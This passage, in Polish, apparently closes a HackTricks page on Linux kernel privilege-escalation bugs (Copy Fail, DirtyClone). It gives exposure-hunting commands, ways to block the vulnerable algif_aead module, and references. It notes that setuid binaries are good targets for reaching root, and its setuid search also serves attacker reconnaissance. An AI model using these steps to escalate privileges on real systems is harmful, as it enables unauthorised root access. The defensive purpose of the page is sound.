Krótkoterminowe ograniczenie powierzchni ataku jest tu również zależne od ścieżki: aktualizacja do kernela zawierającego `48f6a5356a33` naprawia ścieżkę `clone`, a zablokowanie autoloadingu `xt_TEE` usuwa **etap prania flagi**, zaś zablokowanie `esp4` / `esp6` usuwa **sink deszyfrujący**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Ekspozycja i hunting

Jeśli podejrzewasz tę klasę błędów, nie polegaj wyłącznie na sprawdzaniu integralności dysku. Sprawdź również:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Wartości konfiguracji poniżej rozróżniają interfejs ładowany jako moduł od interfejsu wbudowanego w kernel; reguły kompilacji crypto mapują `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` można ładować i usuwać jako moduł
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- pliki binarne setuid są dobrym celem, ponieważ poprawka dotycząca wyłącznie page cache może wystarczyć, by zmienić lokalny foothold w dostęp root

#### Ograniczanie powierzchni ataku dla ścieżki `algif_aead`

Jeśli podatny interfejs jest udostępniany przez ładowalny moduł:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Jeśli jest wkompilowany w jądro, w niektórych zgłoszeniach opisywano blokowanie ścieżki init za pomocą:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Tego rodzaju środek zaradczy warto mieć na uwadze również w przypadku innych kernel LPE: jeśli exploit zależy od konkretnego opcjonalnego interfejsu, wyłączenie go lub dodanie do blacklisty może przerwać ścieżkę exploita jeszcze przed udostępnieniem pełnej aktualizacji kernela.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo — przejęcie skryptu uruchamianego przez root w zapisywalnym przez użytkownika katalogu PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ujawnienie podatności CVE-2026-31431 na liście Openwall oss-security](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Poprawka Linux stable: crypto: algif_aead — powrót do operacji poza miejscem](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — poradnik dotyczący CVE-2026-31431](https://copy.fail/)
- [7] [Techniczny opis Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repozytorium DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i wykorzystanie wariantu Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Poprawka Linux: net: skb: zachowanie `SKBFL_SHARED_FRAG` w `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Wcześniejszy środek zaradczy w Linux: ustawianie `SKBFL_SHARED_FRAG` dla pakietów UDP przekazywanych przez splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — strona podręcznika Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacja Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Powiązania aplikacji MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specyfikacja Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specyfikacja Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Język Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Plik Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: podatność pamięci podręcznej stron w AF_ALG jądra Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Dokumentacja Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Dokumentacja Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Dokumentacja konfiguracji Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — strona podręcznika Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentacja generatorów systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — inżynieria detekcji w Linux: mechanizmy utrwalania](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
